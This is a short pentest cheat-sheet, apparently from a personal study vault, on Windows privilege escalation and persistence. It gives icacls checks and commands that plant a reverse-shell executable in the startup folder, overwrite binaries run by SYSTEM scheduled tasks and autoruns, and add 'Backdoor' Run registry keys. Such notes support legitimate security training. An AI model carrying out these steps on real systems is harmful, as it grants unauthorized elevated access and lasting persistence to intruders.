---
tags:
  - Exploitation
  - Foundational
  - Privilege_Escalation
  - Windows
---

## Scheduled Tasks and Autoruns Exploitation
resources: [HackTricks Scheduled Tasks](https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#scheduled-tasks), [HackTricks Autoruns](https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#run-at-startup)

> [!info] Exploit writable scheduled tasks, startup folders, or autorun registry keys to escalate privileges or persist.

### Startup Folder Hijack
> [!tip] If `icacls` shows write permissions on the startup folder, drop a payload to execute on next admin login.

```powershell
icacls "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp"
```

```powershell
Copy-Item C:\path\to\reverse.exe "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\legit.exe"
```

### Scheduled Task Binary Hijack
> [!tip] If a SYSTEM task runs a binary you can overwrite, replace it with your payload.

```powershell
# Find the binary path from schtasks output
icacls "C:\Path\To\ScheduledBinary.exe"
```

```cmd
move "C:\Path\To\ScheduledBinary.exe" "C:\Path\To\ScheduledBinary.exe.bak"
copy C:\path\to\reverse.exe "C:\Path\To\ScheduledBinary.exe"
```

### Autorun Registry Hijack
> [!tip] If you can modify autorun registry keys or overwrite the binary they point to.

#### Overwrite Autorun Binary
```powershell
# Check permissions on autorun binary
icacls "C:\Path\To\AutorunBinary.exe"
```

```cmd
move "C:\Path\To\AutorunBinary.exe" "C:\Path\To\AutorunBinary.exe.bak"
copy C:\path\to\reverse.exe "C:\Path\To\AutorunBinary.exe"
```

#### Add New Autorun Entry
> [!warning] Requires write access to registry key. Executes on user login.

```cmd
reg add "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v Backdoor /t REG_SZ /d "C:\path\to\reverse.exe"
```

```cmd
reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v Backdoor /t REG_SZ /d "C:\path\to\reverse.exe"
```
